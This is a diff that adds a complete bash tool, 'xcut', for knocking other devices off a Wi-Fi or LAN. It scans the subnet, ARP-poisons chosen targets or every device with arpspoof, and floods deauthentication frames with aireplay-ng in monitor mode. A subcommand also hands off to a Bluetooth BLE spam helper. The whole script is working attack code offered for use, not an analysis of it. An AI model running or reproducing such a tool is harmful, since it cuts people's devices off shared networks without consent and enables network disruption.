@@ -1,0 +1,404 @@
+#!/bin/bash
+# xcut - block devices on your Wi-Fi/LAN using ARP spoofing.
+#
+#   xcut scan               discover active devices on the subnet
+#   xcut list               show last scan results (numbered)
+#   xcut cut   <nr|ip|all>  block a device (or everyone except router) off the network
+#   xcut stop               restore connectivity to all blocked devices
+#
+# Needs: iproute2 (ip), dsniff  -> /usr/bin/arpspoof, iputils (ping/arping).
+# Elevates itself to root (sudo) for the actions that need raw sockets.
+
+set -u
+
+GW=""
+DEV=""
+MY=""
+SUBNET3=""
+
+CACHE_DIR="$HOME/.local/share/xcut"
+NETFILE="$CACHE_DIR/hosts.last"
+STATE="$CACHE_DIR/victims"
+EXCLUDE="$CACHE_DIR/exclude"
+
+die() { echo "error: $*" >&2; exit 1; }
+
+usage() {
+    cat <<'EOF'
+xcut - block Wi-Fi/LAN device access using ARP spoofing
+
+usage:
+  xcut scan               scan and list active devices (numbered)
+  xcut list               show last scan list
+  xcut cut  <nr|ip|all>   block one device / ip / every device
+  xcut uncut <nr|ip|all>  unblock one device (or all = same as stop)
+  xcut stop               restore connectivity to everything
+
+  xcut deauth <nr|ip|all> KICK device off WiFi and keep it off (monitor
+                            mode; your own WiFi drops while active)
+  xcut deauth stop        stop deauth, restore your interface
+
+  xcut exclude            list excluded devices (skipped by cut all / deauth all)
+  xcut exclude <nr|ip>    add a device to the exclude list
+  xcut exclude -<nr|ip>   remove a device from the exclude list
+
+  xcut ble  on|off|raw <hex|scan>
+                            bluetooth BLE spam/find-my/ibeacon/eddystone
+EOF
+    exit 0
+}
+
+get_netinfo() {
+    local line
+    line="$(ip route get 1.1.1.1 2>/dev/null | head -1)"
+    GW="$(echo "$line" | awk '/via/{print $3; exit}')"
+    DEV="$(echo "$line" | awk '/dev/{print $5; exit}')"
+    MY="$(echo "$line" | grep -o 'src [0-9.]*' | awk '{print $2}')"
+    [ -z "$DEV" ] && die "no active interface found"
+    [ -z "$MY" ] && MY="$(ip -4 -o addr show dev "$DEV" | awk '/inet/{split($4,a,"/");print a[1];exit}')"
+    [ -z "$GW" ] && GW="$(echo "$MY" | awk -F. '{print $1"."$2"."$3".1"}')"
+    SUBNET3="$(echo "$MY" | awk -F. '{print $1"."$2"."$3}')"
+}
+
+neigh_scan() {
+    ip neigh show dev "$DEV" | awk -v gw="$GW" -v me="$MY" '
+        $1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && ($2=="lladdr"||$3=="lladdr") {
+            mac = ($2=="lladdr") ? $3 : $4
+            state = $NF
+            if (state=="REACHABLE"||state=="STALE"||state=="DELAY"||state=="PROBE") {
+                if ($1!=gw && $1!=me) print $1, mac
+            }
+        }'
+}
+
+scan() {
+    get_netinfo
+    mkdir -p "$CACHE_DIR"
+    local tmp i ip mac
+    tmp="$(mktemp)"
+    echo "Scanning ${SUBNET3}.1-254 via $DEV (router $GW) ..."
+
+    if command -v arp-scan >/dev/null 2>&1; then
+        echo "using arp-scan (sees devices that ignore ping)"
+        arp-scan --interface "$DEV" --localnet -g 2>/dev/null \
+            | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $2 ~ /^[0-9a-f:]{17}$/ {sub(/^ +/," ",$3); print $1, $2, substr($0, index($0,$3))}' \
+            > "$tmp"
+    else
+        echo "using ping sweep + neighbor table; better results with arp-scan:"
+        echo "  sudo pacman -S arp-scan"
+        for i in $(seq 1 254); do ( ping -c1 -W1 -i 0.2 "${SUBNET3}.$i" >/dev/null 2>&1 ) & done
+        wait
+        sleep 1
+        neigh_scan > "$tmp"
+    fi
+
+    # passive watch: catch devices that answer ARP late
+    for i in 1 2 3; do
+        neigh_scan >> "$tmp"
+        sleep 2
+    done
+
+    # dedupe by MAC, drop router/self, attach vendor/hostname
+    sort -u -k2,2 "$tmp" | while read -r ip mac rest; do
+        [ "$ip" = "$GW" ] && continue
+        [ "$ip" = "$MY" ] && continue
+        [ -z "$mac" ] && continue
+        name=""
+        [ -n "${rest:-}" ] && name="$rest" \
+            || name="$(getent hosts "$ip" 2>/dev/null | awk '{print $2; exit}')"
+        echo "$ip $mac $name"
+    done > "$NETFILE"
+    list_hosts
+}
+
+list_hosts() {
+    if [ -s "$NETFILE" ]; then
+        printf '%-4s %-18s %-19s %s\n' "No." "IP" "MAC" "Name"
+        awk '{printf "%-4d %-18s %-19s %s\n", NR, $1, $2, ($3==""?"?":$3)}' "$NETFILE"
+    else
+        echo "no scan results -> run: xcut scan"
+    fi
+    if [ -s "$STATE" ]; then
+        echo "== blocked:"
+        awk '{printf "  %d  %s\n", NR, $1}' "$STATE"
+        echo "  uncut with:  xcut uncut <nr|ip|all>"
+    fi
+}
+
+resolve_target() {
+    local t="$1"
+    case "$t" in
+        all) echo "ALL";;
+        [0-9]*) awk -v n="$t" 'NR==n{print $1; exit}' "$NETFILE" ;;
+        *) echo "$t" ;;
+    esac
+}
+
+resolve_blocked() {
+    local t="$1"
+    case "$t" in
+        all) echo "ALL";;
+        [0-9]*) awk -v n="$t" 'NR==n{print $1; exit}' "$STATE" ;;
+        *) echo "$t" ;;
+    esac
+}
+
+require_root() { [ "$(id -u)" -ne 0 ] && exec sudo "$0" "$@"; }
+
+require_arpspoof() {
+    command -v arpspoof >/dev/null 2>&1 || {
+        echo "arpspoof (dsniff) is missing."
+        echo "install it with:  sudo pacman -S --noconfirm dsniff"
+        exit 1
+    }
+}
+
+start_poison() {          # $1 = victim IP
+    local v="$1"
+    arpspoof -i "$DEV" -t "$v" "$GW" >/dev/null 2>&1 &
+    arpspoof -i "$DEV" -t "$GW" "$v" >/dev/null 2>&1 &
+    echo "$v" >> "$STATE"
+    sleep 0.5
+    if ! pkill -0 -f "arpspoof -i $DEV" 2>/dev/null; then
+        echo "  arpspoof failed to start for $v"
+        return 1
+    fi
+    echo "cut: $v"
+}
+
+cut_target() {
+    local t="$1" obj
+    obj="$(resolve_target "$t")"
+    [ -n "$obj" ] || die "target not found in last scan (run xcut scan)"
+    if [ "$obj" = "ALL" ]; then
+        echo "== cutting ALL devices (except router $GW, this laptop $MY, and exclusions) =="
+        awk -v gw="$GW" -v me="$MY" '$1!=gw && $1!=me{print $1, $2}' "$NETFILE" \
+            | while read -r ip mac; do
+                if is_excluded "$ip" "$mac"; then echo "  skipped (excluded): $ip"; continue; fi
+                start_poison "$ip"
+              done
+    else
+        [ "$obj" = "$MY" ] && die "refusing to cut this laptop ($MY)"
+        mac="$(awk -v ip="$obj" '$1==ip{print $2; exit}' "$NETFILE")"
+        is_excluded "$obj" "$mac" && die "refusing to cut excluded device $obj (see: xcut exclude)"
+        start_poison "$obj"
+    fi
+    echo "restore with: xcut stop"
+}
+
+stop_cut() {
+    [ -s "$STATE" ] || { echo "nothing is cut right now"; exit 0; }
+    while read -r ip; do
+        [ -n "$ip" ] && uncut_target "$ip"
+    done < "$STATE"
+    rm -f "$STATE"
+    echo "done."
+}
+
+uncut_target() {          # $1 = victim IP; root
+    local ip="$1"
+    pkill -f "arpspoof -i $DEV -t $ip $GW" 2>/dev/null
+    pkill -f "arpspoof -i $DEV -t $GW $ip" 2>/dev/null
+    arping -q -c 3 -A -I "$DEV" "$ip" 2>/dev/null
+    arping -q -c 3 -A -I "$DEV" "$GW" 2>/dev/null
+    grep -vx "$ip" "$STATE" > "$STATE.tmp" 2>/dev/null && mv "$STATE.tmp" "$STATE"
+    echo "uncut: $ip"
+}
+
+uncut_cmd() {
+    local t="$1" obj
+    obj="$(resolve_blocked "$t")"
+    [ -n "$obj" ] || die "blocked list is empty"
+    if [ "$obj" = "ALL" ]; then
+        while read -r ip; do [ -n "$ip" ] && uncut_target "$ip"; done < "$STATE"
+        rm -f "$STATE"
+        echo "all restored."
+    else
+        uncut_target "$obj"
+        [ -s "$STATE" ] || echo "all restored."
+    fi
+}
+
+cmd_ble() {
+    local bin home="$HOME/.local/bin"
+    [ -r "$home/xcut-ble" ] || home="$(dirname "$(realpath "$0")")"
+    exec "$home/xcut-ble" "$@"
+}
+
+# ---- exclude (allowlist) ----
+
+to_ip() {   # nr -> ip from NETFILE; else pass ip/mac through unchanged
+    if [[ "$1" =~ ^[0-9]+$ ]]; then
+        awk -v n="$1" 'NR==n{print $1; exit}' "$NETFILE"
+    else
+        echo "$1"
+    fi
+}
+
+is_excluded() {         # $1 = IP, $2 = MAC (may be empty)
+    [ -f "$EXCLUDE" ] || return 1
+    local ip="$1" mac="${2:-}" line
+    while read -r line; do
+        [ -z "$line" ] && continue
+        [ "$line" = "$ip" ] && return 0
+        [ -n "$mac" ] && [ "$line" = "$mac" ] && return 0
+    done < "$EXCLUDE"
+    return 1
+}
+
+cmd_exclude() {
+    mkdir -p "$CACHE_DIR"
+    local arg="${1:-}" ip
+    if [ -z "$arg" ]; then
+        if [ -s "$EXCLUDE" ]; then
+            echo "excluded devices:"
+            while read -r line; do
+                [ -n "$line" ] && echo "  - $line"
+            done < "$EXCLUDE"
+        else
+            echo "nothing excluded yet"
+        fi
+        return
+    fi
+    if [ "${arg:0:1}" = "-" ]; then
+        ip="$(to_ip "${arg:1}")"
+        [ -n "$ip" ] || die "no such entry"
+        [ -f "$EXCLUDE" ] && sed -i "\|^$ip$|d" "$EXCLUDE"
+        echo "removed $ip from exclude list"
+    else
+        ip="$(to_ip "$arg")"
+        [ -n "$ip" ] || die "no entry matching '$arg' (run: xcut list)"
+        grep -qx "$ip" "$EXCLUDE" 2>/dev/null || echo "$ip" >> "$EXCLUDE"
+        echo "added $ip to exclude list (skipped by cut all / deauth all)"
+    fi
+}
+
+# ---- deauth (guard against WiFi re-association) ----
+
+require_aireplay() {
+    command -v aireplay-ng >/dev/null 2>&1 || {
+        echo "aireplay-ng (aircrack-ng) is missing."
+        echo "install it with:  sudo pacman -S --noconfirm aircrack-ng"
+        exit 1
+    }
+}
+
+router_mac() {
+    local mac
+    mac="$(ip neigh show dev "$DEV" | awk -v g="$GW" '$1==g && $2=="lladdr"{print $3; exit}')"
+    if [ -z "$mac" ]; then
+        arping -q -c 1 -W 1 -I "$DEV" "$GW" >/dev/null 2>&1
+        sleep 0.5
+        mac="$(ip neigh show dev "$DEV" | awk -v g="$GW" '$1==g && $2=="lladdr"{print $3; exit}')"
+    fi
+    echo "$mac"
+}
+
+deauth_targets() {          # $1 = nr|ip|all  -> emits victim MACs
+    local t="$1"
+    if [ "$t" = "all" ]; then
+        awk -v gw="$GW" -v me="$MY" '$1!=gw && $1!=me{print $1, $2}' "$NETFILE" \
+            | while read -r ip mac; do
+                is_excluded "$ip" "$mac" && { echo "  skipped (excluded): $ip" >&2; continue; }
+                echo "$mac"
+              done
+    else
+        local ip
+        ip="$(resolve_target "$t")"
+        [ -n "$ip" ] || die "target not found in last scan (run xcut scan)"
+        [ "$ip" = "$MY" ] && die "refusing to deauth this laptop ($MY)"
+        mac="$(awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE")"
+        is_excluded "$ip" "$mac" && die "refusing to deauth excluded device $ip (see: xcut exclude)"
+        awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE"
+    fi
+}
+
+deauth_start() {            # $1 = nr|ip|all  (root)
+    require_aireplay
+    local macs ch apmac dpid
+    macs="$(deauth_targets "$1")"
+    [ -n "$macs" ] || die "no device match for '$1'"
+    apmac="$(router_mac)"
+    [ -n "$apmac" ] || die "could not resolve router MAC via $DEV"
+    ch="$(iw dev "$DEV" info 2>/dev/null | awk '/channel/{print $2; exit}')"
+    echo "== kicking '$1' off AP $GW ($apmac) via $DEV (monitor) =="
+    echo "   WARNING: your own WiFi link drops while deauth runs."
+    echo "   restore with:  xcut deauth stop"
+    > "$CACHE_DIR/deauth.pids"
+    > "$CACHE_DIR/deauth.list"
+    nmcli dev set "$DEV" managed off >/dev/null 2>&1 || true
+    ip link set "$DEV" down
+    iw dev "$DEV" set type monitor
+    ip link set "$DEV" up
+    sleep 0.3
+    [ -n "$ch" ] && iw dev "$DEV" set channel "$ch" 2>/dev/null
+    if [ "$1" = "all" ]; then
+        aireplay-ng --deauth 0 -a "$apmac" "$DEV" >>"$CACHE_DIR/deauth.log" 2>&1 &
+        echo $! >> "$CACHE_DIR/deauth.pids"
+    else
+        echo "$macs" | grep -v '^[[:space:]]*$' | while read -r m; do
+            aireplay-ng --deauth 0 -a "$apmac" -c "$m" "$DEV" >>"$CACHE_DIR/deauth.log" 2>&1 &
+            echo $! >> "$CACHE_DIR/deauth.pids"
+            echo "$m" >> "$CACHE_DIR/deauth.list"
+        done
+    fi
+    sleep 1.5
+    echo "$DEV" > "$STATE.deauth"
+    pgrep -f "aireplay-ng --deauth" >/dev/null || { echo "  deauth did not start - check dmesg / injection support"; }
+    if [ "$1" = "all" ]; then
+        echo "deauth running (broadcast: all clients). stop: xcut deauth stop"
+    else
+        echo "deauth running (target $(wc -l < "$CACHE_DIR/deauth.list" | tr -d ' ') MAC). stop: xcut deauth stop"
+    fi
+}
+
+deauth_stop() {
+    if [ -s "$CACHE_DIR/deauth.pids" ]; then
+        while read -r p; do kill "$p" 2>/dev/null; done < "$CACHE_DIR/deauth.pids"
+        sleep 1
+    fi
+    pkill -f "aireplay-ng --deauth" 2>/dev/null
+    if [ -s "$STATE.deauth" ]; then
+        read -r DEV < "$STATE.deauth"
+    else
+        DEV="${DEV:-wlan0}"
+        command -v iw >/dev/null 2>&1 && DEV="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface/{print $2; exit}')"
+        [ -n "$DEV" ] || DEV="wlan0"
+    fi
+    ip link set "$DEV" down 2>/dev/null
+    iw dev "$DEV" set type managed 2>/dev/null || true
+    ip link set "$DEV" up 2>/dev/null
+    nmcli dev set "$DEV" managed on >/dev/null 2>&1 || true
+    rm -f "$CACHE_DIR/deauth.pids" "$CACHE_DIR/deauth.list" \
+          "$CACHE_DIR/deauth.log" "$STATE.deauth"
+    echo "interface $DEV restored; Wi-Fi will re-associate now"
+}
+
+main() {
+    case "${1:-}" in
+        scan)                require_root "$@"; scan ;;
+        list)                list_hosts ;;
+        cut)  [ -n "${2:-}" ] || usage
+                              require_root "$@"; require_arpspoof; get_netinfo
+                              cut_target "$2" ;;
+        stop)                require_root "$@"; require_arpspoof; get_netinfo
+                              stop_cut ;;
+uncut) [ -n "${2:-}" ] || usage
+                              require_root "$@"; require_arpspoof; get_netinfo
+                              uncut_cmd "$2" ;;
+        deauth) require_root "$@"
+              if [ "${2:-}" = "stop" ]; then
+                  deauth_stop
+              else
+                  [ -n "${2:-}" ] || usage
+                  get_netinfo
+                  deauth_start "$2"
+              fi ;;
+        exclude) require_root "$@"
+                              cmd_exclude "${2:-}" ;;
+        ble)   require_root "$@"
+                              cmd_ble "${@:2}" ;;  # forward all args after "ble"
+        *)                   usage ;;
+    esac
+}
+main "$@"
